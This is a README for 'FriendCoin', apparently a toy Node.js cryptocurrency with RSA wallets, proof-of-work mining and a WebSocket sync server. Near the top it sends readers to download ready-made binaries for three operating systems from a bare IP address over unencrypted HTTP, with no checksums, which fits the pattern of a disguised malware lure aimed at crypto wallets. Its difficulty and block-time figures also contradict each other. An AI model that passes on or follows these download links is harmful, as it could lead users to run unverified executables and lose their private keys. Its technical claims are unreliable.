# FriendCoin 🪙

> Your own cryptocurrency — for your own people.

Mine blocks, sign transactions, send coins to your friends. No banks, no exchanges, no VCs. Just a tiny, honest blockchain running between you and the people you actually know — with real RSA signatures, real Proof-of-Work, and a genesis block you can hold in your hand (well, in a JSON file).

It's Bitcoin's little cousin who shows up to the family barbecue: same DNA, way more fun, zero gas fees.

---

## Download a ready-made client

No Node.js required — grab the binary for your OS and run it:

| Platform              | Link                                                       |
| --------------------- | ---------------------------------------------------------- |
| macOS (Apple Silicon) | [Download](http://155.212.227.116:8089/download/mac)        |
| Linux (x64)           | [Download](http://155.212.227.116:8089/download/linux)      |
| Windows (x64)         | [Download](http://155.212.227.116:8089/download/win)        |

Or just open the [downloads page](http://155.212.227.116:8089/download).

## Why this exists

Crypto got complicated. Wallets you can't read, fees you can't predict, chains you can't run. FriendCoin strips it back to the part that's actually magical:

- You own a key. The key owns coins. Nobody can fake your signature.
- You mine a block. The math is real. The reward is yours.
- Your friend gets the coins. The ledger agrees. Done.

It's a working blockchain you can read end-to-end over a coffee — and then run with your friends over the same WiFi.

## How it works

- 🔑 Every player gets an **RSA wallet** (public + private key)
- ✍️ Every transaction is **signed** with the private key — forgery is impossible
- ⛏️ Blocks are mined with **Proof-of-Work** (just like Bitcoin, only friendlier)
- 💰 The mining reward is **10% of the transaction volume** in the block (capped at 10 coins)
- 🪹 You can mine **empty blocks** too (no transactions) — but the reward is just 1 coin
- 🎲 Max **3 transactions per block**, chosen at random
- 🛡️ A miner earns **no commission** on transactions they're part of (no self-dealing)
- 🌐 Every client stays in sync through a **WebSocket server**
- 🔔 Built-in **update notifications** — the server checks your client version on connect

## Quick start (from source)

**1. Clone the repo**

```bash
git clone <repo-url>
cd BLOCKCHAIN
```

**2. Install dependencies**

```bash
npm install
```

**3. Fire up the client**

```bash
node start.js
```

On first launch you'll be asked to create a wallet — just enter your name (latin letters, no spaces). Your wallet is saved to `wallet_<name>.json`. That file *is* your money. Guard it.

## Commands

| Command                | What it does                                             |
| ---------------------- | -------------------------------------------------------- |
| `balance`              | Show your current balance                                |
| `send <name> <amount>` | Send coins to a friend                                   |
| `mine`                 | Mine a block (with transactions if any, empty otherwise) |
| `friends`              | List everyone in the network                             |
| `address`              | Show your public address                                 |
| `syncpool`             | Sync the transaction pool with the server                |
| `help`                 | Command reference                                        |
| `exit`                 | Quit                                                     |

## A day in the life

```
Alice> send Bob 50
💸 Sent 50 coins to Bob

Bob> mine
⛏️  Block #3 mined in 2.4 seconds!
   Reward: 5 coins (10% of volume, max 10)

Bob> balance
💰 Balance: 55 coins
```

That's the whole loop. Send, mine, repeat — until someone's rich enough to gloat in the group chat.

## Under the hood

```
blockchain.js  — the core: Transaction, Block, Blockchain (SHA-256, RSA, PoW)
wallet.js      — RSA-2048 key generation & storage
user.js        — the client: server connection, CLI, sending & mining
start.js       — entry point: pick or create a wallet
server.js      — WebSocket server: keeps every client's chain in sync
```

Five files. No framework. No build step. Open any one of them and you'll understand it.

## Wallet security

The file `wallet_<name>.json` holds your **private key**. Whoever holds it, holds the coins. The safest place to keep it is on a **USB stick or external drive** — away from the project folder.

### Running a wallet straight from a USB stick

When you run `node start.js`, pick **"Load wallet from USB / drive"** and point it at the file:

```
Path to wallet file (wallet_*.json): /Volumes/MYFLASH/wallet_Bob.json
```

The keys load directly from the drive — no need to copy anything into the project.

### House rules

- **Never lose your wallet file** — lost key = lost coins, forever
- **Never show your private key to anyone** — with it, they can spend your coins
- **Never commit your wallet to git** — `wallet_*.json` is already in `.gitignore`, but stay sharp
- Friends appear in your address book automatically when they connect to the server
- For a transaction to confirm, someone has to mine a block (`mine`)
- You can mine without transactions too — the reward is just 1 coin, but the difficulty is higher

## The economy

| Parameter                  | Value                                                  |
| -------------------------- | ------------------------------------------------------ |
| Initial supply             | 1000 coins (genesis block)                             |
| Block reward               | 10% of transaction volume                              |
| Reward cap                 | 10 coins                                               |
| Empty block                | 1 coin, same difficulty                                |
| Max transactions per block | 3 (randomly selected)                                  |
| Difficulty (PoW)           | 7.5 (auto-tunes every 50 blocks, targeting ~10 min)    |

## Requirements

- Node.js 16+
- npm

---

Built for friends, by friends. Now go mine something. ⛏️
